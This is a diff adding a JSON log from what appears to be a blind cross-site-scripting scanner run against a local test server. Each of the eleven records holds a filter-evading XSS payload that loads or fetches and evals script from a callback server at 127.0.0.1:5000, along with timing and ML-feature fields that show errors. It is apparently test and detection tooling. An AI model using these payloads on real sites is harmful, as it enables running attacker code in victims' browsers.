@@ -1,0 +1,233 @@
+[
+  {
+    "url": "http://127.0.0.1:8000/comment?text=hello",
+    "parameter": "text",
+    "payload": "\" >< iframe srcdoc=\"< scr< !-- -- >ipt >fetch('http://127.0.0.1:5000/c/14b554ef-61d4-4403-967d-62fc4c4f9396')< /scr< !-- -- >ipt >\" / >",
+    "injection_timestamp": "2026-03-08T13:48:05.274987",
+    "callback_timestamp": "2026-03-08T13:48:05.625968",
+    "callback_source_ip": "127.0.0.1",
+    "callback_user_agent": "python-requests/2.32.4",
+    "callback_referer": "",
+    "callback_x_forwarded_for": "",
+    "uuid": "14b554ef-61d4-4403-967d-62fc4c4f9396",
+    "delay_seconds": 0.350981,
+    "injection_age_hours": 0.004526457222222222,
+    "ml_features": {
+      "delay_seconds": 0.350981,
+      "callback_repeat_count": 1,
+      "ua_present": 1.0
+    },
+    "anomaly_score": null,
+    "ml_confidence": "Error: X has 14 features, but StandardScaler is expecting"
+  },
+  {
+    "url": "http://127.0.0.1:8000/comment?text=hello",
+    "parameter": "text",
+    "payload": "javascr< !-- -- >ipt:\"/*'/*`/*-- >< /noscr< !-- -- >ipt >< /title >< /textarea >< /style >< /template >< /noembed >< /scr< !-- -- >ipt >< html \" onmouseover=/*< svg/*/on< !-- -- >load=(import(/https:\\127.0.0.1:5000\\c\\32694f93-e53b-4ec0-9348-d4d262f0c510/.source))// >",
+    "injection_timestamp": "2026-03-08T13:48:04.268857",
+    "callback_timestamp": "2026-03-08T13:48:04.711168",
+    "callback_source_ip": "127.0.0.1",
+    "callback_user_agent": "python-requests/2.32.4",
+    "callback_referer": "",
+    "callback_x_forwarded_for": "",
+    "uuid": "32694f93-e53b-4ec0-9348-d4d262f0c510",
+    "delay_seconds": 0.442311,
+    "injection_age_hours": 0.0048059377777777785,
+    "ml_features": {
+      "delay_seconds": 0.442311,
+      "callback_repeat_count": 1,
+      "ua_present": 1.0
+    },
+    "anomaly_score": null,
+    "ml_confidence": "Error: X has 14 features, but StandardScaler is expecting"
+  },
+  {
+    "url": "http://127.0.0.1:8000/comment?text=hello",
+    "parameter": "text",
+    "payload": "<audio src=\"x\" on<!-- -->error=\"var a=document.createelement('scr<!-- -->ipt');a.src='http://127.0.0.1:5000/c/e4ee2cd3-6ed0-46a6-919e-8857788708e1';document.body.appendchild(a)\">",
+    "injection_timestamp": "2026-03-08T13:48:03.770439",
+    "callback_timestamp": "2026-03-08T13:48:04.270690",
+    "callback_source_ip": "127.0.0.1",
+    "callback_user_agent": "python-requests/2.32.4",
+    "callback_referer": "",
+    "callback_x_forwarded_for": "",
+    "uuid": "e4ee2cd3-6ed0-46a6-919e-8857788708e1",
+    "delay_seconds": 0.500251,
+    "injection_age_hours": 0.004944387222222222,
+    "ml_features": {
+      "delay_seconds": 0.500251,
+      "callback_repeat_count": 1,
+      "ua_present": 1.0
+    },
+    "anomaly_score": null,
+    "ml_confidence": "Error: X has 14 features, but StandardScaler is expecting"
+  },
+  {
+    "url": "http://127.0.0.1:8000/comment?text=hello",
+    "parameter": "text",
+    "payload": "< div onmouseover=\"var a=document.createelement('script');a.src='http://127.0.0.1:5000/c/9a77a88e-dda3-458c-9856-8957f4c3a8dd';document.body.appendchild(a)\" >hover me< /div >",
+    "injection_timestamp": "2026-03-08T13:48:03.224922",
+    "callback_timestamp": "2026-03-08T13:48:03.772607",
+    "callback_source_ip": "127.0.0.1",
+    "callback_user_agent": "python-requests/2.32.4",
+    "callback_referer": "",
+    "callback_x_forwarded_for": "",
+    "uuid": "9a77a88e-dda3-458c-9856-8957f4c3a8dd",
+    "delay_seconds": 0.547685,
+    "injection_age_hours": 0.005095919722222222,
+    "ml_features": {
+      "delay_seconds": 0.547685,
+      "callback_repeat_count": 1,
+      "ua_present": 1.0
+    },
+    "anomaly_score": null,
+    "ml_confidence": "Error: X has 14 features, but StandardScaler is expecting"
+  },
+  {
+    "url": "http://127.0.0.1:8000/comment?text=hello",
+    "parameter": "text",
+    "payload": "var a=document.createElement(\"scr< !-- -- >ipt\");a.src=\"http://127.0.0.1:5000/c/91c66ead-643f-4c99-a594-902a2a2a5fb8\";document.body.appendChild(a);",
+    "injection_timestamp": "2026-03-08T13:48:01.125127",
+    "callback_timestamp": "2026-03-08T13:48:01.725786",
+    "callback_source_ip": "127.0.0.1",
+    "callback_user_agent": "python-requests/2.32.4",
+    "callback_referer": "",
+    "callback_x_forwarded_for": "",
+    "uuid": "91c66ead-643f-4c99-a594-902a2a2a5fb8",
+    "delay_seconds": 0.600659,
+    "injection_age_hours": 0.005679196111111111,
+    "ml_features": {
+      "delay_seconds": 0.600659,
+      "callback_repeat_count": 1,
+      "ua_present": 1.0
+    },
+    "anomaly_score": null,
+    "ml_confidence": "Error: X has 14 features, but StandardScaler is expecting"
+  },
+  {
+    "url": "http://127.0.0.1:8000/comment?text=hello",
+    "parameter": "text",
+    "payload": "< script >fetch(\"//127.0.0.1:5000/c/1dce0d87-a312-4ab2-9835-52428da132bf\").then(r= >r.text()).then(t= >eval(t))< /script >",
+    "injection_timestamp": "2026-03-08T13:48:00.509387",
+    "callback_timestamp": "2026-03-08T13:48:01.142288",
+    "callback_source_ip": "127.0.0.1",
+    "callback_user_agent": "python-requests/2.32.4",
+    "callback_referer": "",
+    "callback_x_forwarded_for": "",
+    "uuid": "1dce0d87-a312-4ab2-9835-52428da132bf",
+    "delay_seconds": 0.632901,
+    "injection_age_hours": 0.0058502350000000005,
+    "ml_features": {
+      "delay_seconds": 0.632901,
+      "callback_repeat_count": 1,
+      "ua_present": 1.0
+    },
+    "anomaly_score": null,
+    "ml_confidence": "Error: X has 14 features, but StandardScaler is expecting"
+  },
+  {
+    "url": "http://127.0.0.1:8000/comment?text=hello",
+    "parameter": "text",
+    "payload": "< scr< !-- -- >ipt >function b(){{eval(this.responseText)}};a=new XMLHttpRequest();a.addEventListener(\"load\", b);a.open(\"GET\", \"//127.0.0.1:5000/c/ce061a7e-48e2-498b-8636-b7bcf4f25bd7\");a.send();< /scr< !-- -- >ipt >",
+    "injection_timestamp": "2026-03-08T13:48:00.059760",
+    "callback_timestamp": "2026-03-08T13:48:00.511678",
+    "callback_source_ip": "127.0.0.1",
+    "callback_user_agent": "python-requests/2.32.4",
+    "callback_referer": "",
+    "callback_x_forwarded_for": "",
+    "uuid": "ce061a7e-48e2-498b-8636-b7bcf4f25bd7",
+    "delay_seconds": 0.451918,
+    "injection_age_hours": 0.005975131388888889,
+    "ml_features": {
+      "delay_seconds": 0.451918,
+      "callback_repeat_count": 1,
+      "ua_present": 1.0
+    },
+    "anomaly_score": null,
+    "ml_confidence": "Error: X has 14 features, but StandardScaler is expecting"
+  },
+  {
+    "url": "http://127.0.0.1:8000/comment?text=hello",
+    "parameter": "text",
+    "payload": "<body on<!-- -->load=\"var a=document.createelement('scr<!-- -->ipt');a.src='http://127.0.0.1:5000/c/91ff0505-c80c-4411-bbb9-e26aa4e2dd3a';document.body.appendchild(a)\">",
+    "injection_timestamp": "2026-03-08T13:47:59.187166",
+    "callback_timestamp": "2026-03-08T13:47:59.633435",
+    "callback_source_ip": "127.0.0.1",
+    "callback_user_agent": "python-requests/2.32.4",
+    "callback_referer": "",
+    "callback_x_forwarded_for": "",
+    "uuid": "91ff0505-c80c-4411-bbb9-e26aa4e2dd3a",
+    "delay_seconds": 0.446269,
+    "injection_age_hours": 0.006217518611111111,
+    "ml_features": {
+      "delay_seconds": 0.446269,
+      "callback_repeat_count": 1,
+      "ua_present": 1.0
+    },
+    "anomaly_score": null,
+    "ml_confidence": "Error: X has 14 features, but StandardScaler is expecting"
+  },
+  {
+    "url": "http://127.0.0.1:8000/comment?text=hello",
+    "parameter": "text",
+    "payload": "< iframe src=\"javascr< !-- -- >ipt:var a=document.createElement('scr< !-- -- >ipt');a.src='http://127.0.0.1:5000/c/22ac0186-e2d4-4272-9971-fda16fe55ff2';document.body.appendChild(a)\" >< /iframe >",
+    "injection_timestamp": "2026-03-08T13:47:58.753253",
+    "callback_timestamp": "2026-03-08T13:47:59.188989",
+    "callback_source_ip": "127.0.0.1",
+    "callback_user_agent": "python-requests/2.32.4",
+    "callback_referer": "",
+    "callback_x_forwarded_for": "",
+    "uuid": "22ac0186-e2d4-4272-9971-fda16fe55ff2",
+    "delay_seconds": 0.435736,
+    "injection_age_hours": 0.0063380500000000005,
+    "ml_features": {
+      "delay_seconds": 0.435736,
+      "callback_repeat_count": 1,
+      "ua_present": 1.0
+    },
+    "anomaly_score": null,
+    "ml_confidence": "Error: X has 14 features, but StandardScaler is expecting"
+  },
+  {
+    "url": "http://127.0.0.1:8000/comment?text=hello",
+    "parameter": "text",
+    "payload": "< svg on<!-- -->load=\"javascr<!-- -->ipt:eval('var a=document.createElement(\"scr<!-- -->ipt\");a.src=\"http://127.0.0.1:5000/c/9b284193-6daa-4cc3-89dd-622bc94bee94\";document.body.appendChild(a)')\" / >",
+    "injection_timestamp": "2026-03-08T13:47:58.286910",
+    "callback_timestamp": "2026-03-08T13:47:58.756919",
+    "callback_source_ip": "127.0.0.1",
+    "callback_user_agent": "python-requests/2.32.4",
+    "callback_referer": "",
+    "callback_x_forwarded_for": "",
+    "uuid": "9b284193-6daa-4cc3-89dd-622bc94bee94",
+    "delay_seconds": 0.470009,
+    "injection_age_hours": 0.006467589722222222,
+    "ml_features": {
+      "delay_seconds": 0.470009,
+      "callback_repeat_count": 1,
+      "ua_present": 1.0
+    },
+    "anomaly_score": null,
+    "ml_confidence": "Error: X has 14 features, but StandardScaler is expecting"
+  },
+  {
+    "url": "http://127.0.0.1:8000/comment?text=hello",
+    "parameter": "text",
+    "payload": "\" >< script src=http://127.0.0.1:5000/c/bb3cfcd3-8e0b-48dc-8ea9-13dde4440e49 >< /script >",
+    "injection_timestamp": "2026-03-08T13:47:57.678186",
+    "callback_timestamp": "2026-03-08T13:47:57.719016",
+    "callback_source_ip": "127.0.0.1",
+    "callback_user_agent": "python-requests/2.32.4",
+    "callback_referer": "",
+    "callback_x_forwarded_for": "",
+    "uuid": "bb3cfcd3-8e0b-48dc-8ea9-13dde4440e49",
+    "delay_seconds": 0.04083,
+    "injection_age_hours": 0.0066366797222222225,
+    "ml_features": {
+      "delay_seconds": 0.04083,
+      "callback_repeat_count": 1,
+      "ua_present": 1.0
+    },
+    "anomaly_score": null,
+    "ml_confidence": "Error: X has 14 features, but StandardScaler is expecting"
+  }
+]
